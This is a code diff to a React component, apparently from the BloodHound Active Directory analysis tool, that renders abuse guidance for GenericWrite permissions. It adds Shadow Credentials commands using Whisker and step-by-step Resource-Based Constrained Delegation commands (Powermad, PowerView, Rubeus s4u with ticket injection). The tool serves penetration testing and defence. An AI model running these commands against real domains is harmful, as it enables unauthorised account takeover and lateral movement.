@@ -18,7 +18,7 @@ import { FC } from 'react';
 import { Typography } from '@mui/material';
 import { EdgeInfoProps } from '../index';
 
-const WindowsAbuse: FC<EdgeInfoProps> = ({ sourceName, sourceType, targetType }) => {
+const WindowsAbuse: FC<EdgeInfoProps> = ({ sourceName, sourceType, targetName, targetType }) => {
     switch (targetType) {
         case 'Group':
             return (
@@ -67,6 +67,36 @@ const WindowsAbuse: FC<EdgeInfoProps> = ({ sourceName, sourceType, targetType })
         case 'User':
             return (
                 <>
+                    <Typography variant='body2'>
+                        GenericWrite grants {sourceName} the permission to write to the "msds-KeyCredentialLink"
+                        attribute of target. Writing to this property allows an attacker to create "Shadow Credentials"
+                        on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the
+                        "AddKeyCredentialLink" edge.
+                    </Typography>
+                    <Typography variant='body2'>
+                        Alternatively, GenericWrite enables {sourceName} to set a ServicePrincipalName (SPN) on the
+                        targeted user, which may be abused in a Targeted Kerberoast attack.
+                    </Typography>
+
+                    <Typography variant='body1'> Shadow Credentials attack </Typography>
+
+                    <Typography variant='body2'>To abuse the permission, use Whisker. </Typography>
+
+                    <Typography variant='body2'>
+                        You may need to authenticate to the Domain Controller as{' '}
+                        {sourceType === 'User' || sourceType === 'Computer'
+                            ? `${sourceName} if you are not running a process as that user/computer`
+                            : `a member of ${sourceName} if you are not running a process as a member`}
+                    </Typography>
+
+                    <Typography component={'pre'}>{'Whisker.exe add /target:<TargetPrincipal>'}</Typography>
+
+                    <Typography variant='body2'>
+                        For other optional parameters, view the Whisker documentation.
+                    </Typography>
+
+                    <Typography variant='body1'> Targeted Kerberoast attack </Typography>
+
                     <Typography variant='body2'>
                         A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with
                         Get-DomainSPNTicket.
@@ -130,58 +160,96 @@ const WindowsAbuse: FC<EdgeInfoProps> = ({ sourceName, sourceType, targetType })
             return (
                 <>
                     <Typography variant='body2'>
-                        Generic write to a computer object can be used to perform a resource based constrained
-                        delegation attack.
+                        GenericWrite grants {sourceName} the permission to write to the "msds-KeyCredentialLink"
+                        attribute of {targetName}. Writing to this property allows an attacker to create "Shadow
+                        Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is
+                        equivalent to the "AddKeyCredentialLink" edge.
                     </Typography>
+
                     <Typography variant='body2'>
-                        Abusing this primitive is currently only possible through the Rubeus project.
+                        Alternatively, GenericWrite on a computer object can be used to perform a Resource-Based
+                        Constrained Delegation attack.
                     </Typography>
+
+                    <Typography variant='body1'> Shadow Credentials attack </Typography>
+
+                    <Typography variant='body2'>To abuse the permission, use Whisker. </Typography>
+
+                    <Typography variant='body2'>
+                        You may need to authenticate to the Domain Controller as{' '}
+                        {sourceType === 'User' || sourceType === 'Computer'
+                            ? `${sourceName} if you are not running a process as that user/computer`
+                            : `a member of ${sourceName} if you are not running a process as a member`}
+                    </Typography>
+
+                    <Typography component={'pre'}>{'Whisker.exe add /target:<TargetPrincipal>'}</Typography>
+
+                    <Typography variant='body2'>
+                        For other optional parameters, view the Whisker documentation.
+                    </Typography>
+
+                    <Typography variant='body1'> Resource-Based Constrained Delegation attack </Typography>
+
+                    <Typography variant='body2'>
+                        Abusing this primitive is possible through the Rubeus project.
+                    </Typography>
+
                     <Typography variant='body2'>
                         First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad
                         project can be used to add a new attacker-controlled computer account:
                     </Typography>
+
                     <Typography component={'pre'}>
                         {
                             "New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"
                         }
                     </Typography>
+
                     <Typography variant='body2'>
                         PowerView can be used to then retrieve the security identifier (SID) of the newly created
                         computer account:
                     </Typography>
+
                     <Typography component={'pre'}>
-                        {
-                            '$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid'
-                        }
+                        $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand
+                        objectsid
                     </Typography>
+
                     <Typography variant='body2'>
                         We now need to build a generic ACE with the attacker-added computer SID as the principal, and
                         get the binary bytes for the new DACL/ACE:
                     </Typography>
+
                     <Typography component={'pre'}>
-                        {'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"' +
+                        {'$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"\n' +
                             '$SDBytes = New-Object byte[] ($SD.BinaryLength)\n' +
                             '$SD.GetBinaryForm($SDBytes, 0)'}
                     </Typography>
+
                     <Typography variant='body2'>
                         Next, we need to set this newly created security descriptor in the
-                        msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again
+                        msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again
                         using PowerView in this case:
                     </Typography>
+
                     <Typography component={'pre'}>
                         {
                             "Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"
                         }
                     </Typography>
+
                     <Typography variant='body2'>
                         We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                     </Typography>
+
                     <Typography component={'pre'}>{'Rubeus.exe hash /password:Summer2018!'}</Typography>
+
                     <Typography variant='body2'>
                         And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname)
                         we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this
                         case grants us access to the file system of the TARGETCOMPUTER:
                     </Typography>
+
                     <Typography component={'pre'}>
                         {
                             'Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt'
